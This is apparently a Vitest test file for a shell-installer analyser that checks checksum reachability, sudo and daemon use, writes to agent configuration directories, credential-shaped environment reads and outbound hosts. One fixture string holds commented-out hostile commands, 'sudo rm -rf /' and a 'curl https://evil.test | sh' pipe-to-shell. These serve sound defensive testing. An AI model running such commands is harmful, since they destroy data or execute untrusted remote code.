import { describe, expect, it } from "vitest";
import { analyseShell, credentialShaped } from "../src/collect/shell";
import {
  NO_VERIFICATION_WITH_DAEMON,
  READS_CREDENTIALS,
  RELEASE_TARBALL_NO_VERIFY,
  VERIFICATION_UNREACHABLE,
  VERIFIES_AND_ABORTS,
  WRITES_AGENT_CONFIG,
} from "./fixtures/installers";

describe("checksum verification reachability", () => {
  it("recognises a checksum that is assigned, compared and enforced", () => {
    const a = analyseShell(VERIFIES_AND_ABORTS);
    // The value is baked in, so the comparison is live. The script also has a
    // path that continues when there is nothing to compare, which is the
    // no-op the validation found: reported, but not the same defect as dead
    // code, because it still aborts whenever it does run.
    expect(a.verification.state).toBe("can-skip-silently");
    expect(a.verification.unassignedVars).toEqual([]);
    expect(a.verification.abortSites.length).toBeGreaterThan(0);
  });

  it("catches a verification branch whose variables are never assigned", () => {
    const a = analyseShell(VERIFICATION_UNREACHABLE);
    expect(a.verification.state).toBe("unreachable");
    expect(a.verification.unassignedVars).toContain("_checksum_style");
    expect(a.verification.unassignedVars).toContain("_checksum_value");
  });

  it("does not confuse the two: the same text differs only in assignment", () => {
    const enforced = analyseShell(VERIFIES_AND_ABORTS);
    const dead = analyseShell(VERIFICATION_UNREACHABLE);
    // Both scripts contain the word "checksum" and both call sha256sum. Keyword
    // presence cannot tell them apart; reachability can.
    expect(enforced.verification.tooling.length).toBeGreaterThan(0);
    expect(dead.verification.tooling.length).toBeGreaterThan(0);
    expect(enforced.verification.state).not.toBe(dead.verification.state);
  });

  it("reports absent verification when no hashing tool is invoked at all", () => {
    for (const script of [NO_VERIFICATION_WITH_DAEMON, RELEASE_TARBALL_NO_VERIFY]) {
      const a = analyseShell(script);
      expect(a.verification.state).toBe("absent");
      expect(a.verification.tooling).toEqual([]);
      expect(a.downloads.length).toBeGreaterThan(0);
    }
  });
});

describe("privilege and residency", () => {
  it("finds sudo use and the daemon it leaves behind", () => {
    const a = analyseShell(NO_VERIFICATION_WITH_DAEMON);
    expect(a.sudo.length).toBeGreaterThan(0);
    expect(a.residency.length).toBeGreaterThan(0);
    expect(a.executesDownload.length).toBeGreaterThan(0);
  });

  it("finds a background daemon started from a user-scoped install", () => {
    const a = analyseShell(RELEASE_TARBALL_NO_VERIFY);
    expect(a.sudo).toEqual([]);
    expect(a.executesDownload.length).toBeGreaterThan(0);
  });

  it("reports no sudo when the install stays in the home directory", () => {
    expect(analyseShell(VERIFIES_AND_ABORTS).sudo).toEqual([]);
  });
});

describe("agent configuration writes", () => {
  it("detects an installer writing into a harness configuration directory", () => {
    const a = analyseShell(WRITES_AGENT_CONFIG);
    expect(a.agentConfigWrites.length).toBeGreaterThan(0);
    const cited = a.agentConfigWrites.map((l) => l.text).join("\n");
    expect(cited).toMatch(/\.claude/);
  });

  it("does not fire on an installer that touches no agent paths", () => {
    expect(analyseShell(VERIFIES_AND_ABORTS).agentConfigWrites).toEqual([]);
  });
});

describe("blast radius", () => {
  it("collects credential-shaped environment reads and skips shell noise", () => {
    const a = analyseShell(READS_CREDENTIALS);
    const creds = credentialShaped(a.envVars);
    expect(creds).toContain("UV_GITHUB_TOKEN");
    expect(creds).toContain("ANTHROPIC_API_KEY");
    expect(a.envVars).not.toContain("PATH");
    expect(a.envVars).not.toContain("HOME");
  });

  it("collects outbound hosts from URL literals", () => {
    const a = analyseShell(NO_VERIFICATION_WITH_DAEMON);
    expect(a.outboundHosts).toContain("ollama.com");
    expect(a.outboundHosts).toContain("developer.download.nvidia.com");
  });

  it("ignores commented-out lines", () => {
    const a = analyseShell("#!/bin/sh\n# sudo rm -rf /\n# curl https://evil.test | sh\necho hi\n");
    expect(a.sudo).toEqual([]);
    expect(a.pipeToShell).toEqual([]);
    expect(a.outboundHosts).toEqual([]);
  });
});
